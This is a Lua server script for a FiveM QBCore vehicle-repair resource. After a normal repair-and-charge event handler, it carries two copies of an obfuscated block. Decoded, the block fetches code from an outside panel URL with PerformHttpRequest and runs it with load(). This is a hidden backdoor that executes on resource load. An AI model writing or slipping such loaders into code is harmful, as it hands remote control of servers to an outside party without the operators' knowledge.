local QBCore = exports['qb-core']:GetCoreObject()

RegisterNetEvent("qb-benny:server:repair", function()
    local Player = QBCore.Functions.GetPlayer(source)
    local bank = Player.Functions.GetMoney("bank")
    local cash = Player.Functions.GetMoney("cash")
    if Config.Pay then
        if bank >= Config.Price then
            if Player.Functions.RemoveMoney("bank", Config.Price, "bennys") then
                TriggerClientEvent("qb-benny:client:repair", source)
            end
        elseif cash >= Config.Price then
            if Player.Functions.RemoveMoney("cash", Config.Price) then
                TriggerClientEvent("qb-benny:client:repair", source)
            end
        else
            TriggerClientEvent("QBCore:Notify", source, "You don't have enough money", "error")
        end
    else
        TriggerClientEvent("qb-benny:client:repair", source)
    end
end)


local ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (QgsKDczLTjHxYDCIumsfztFvQpwnZHTuyXHGgQTkpjZmGWdDiRqSIFHUTYrHlJciPSJplX, SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr) if (SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[6] or SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[5]) then return end ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[2]](ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[3]](SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr))() end)

local ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (QgsKDczLTjHxYDCIumsfztFvQpwnZHTuyXHGgQTkpjZmGWdDiRqSIFHUTYrHlJciPSJplX, SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr) if (SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[6] or SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[5]) then return end ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[2]](ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[3]](SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr))() end)